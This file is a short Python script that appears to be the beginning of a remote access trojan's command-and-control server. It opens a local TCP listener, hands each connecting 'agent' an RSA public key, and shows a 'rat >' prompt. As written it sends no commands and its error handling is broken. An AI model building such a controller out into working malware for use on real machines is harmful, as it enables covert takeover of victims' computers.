#!/usr/bin/python3
import socket
import rsa
from cryptography.fernet import Fernet

def create_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False)
    s.settimeout(0.5)
    s.bind((ip, port))
    s.listen()
    print("[*] Listening on 62832...")
    return s

s = create_socket("127.0.0.1", 62832)
public_key, private_key=rsa.newkeys(2048)
print(public_key)

running=True
try:
    while running:
        try:
            client_socket, client_address = s.accept()
            print(client_address)
            client_socket.send(public_key.save_pkcs1())

            print("[+] Agent recieved !")
            cmd=input('rat > ')
            if cmd=="shutdown":
                exit("Server stopped.")
        except Exception as e:
            pass
except Exception as e:
    if e!="KeyboardInterrupt":
        print(e)
    print("Server stopped.")
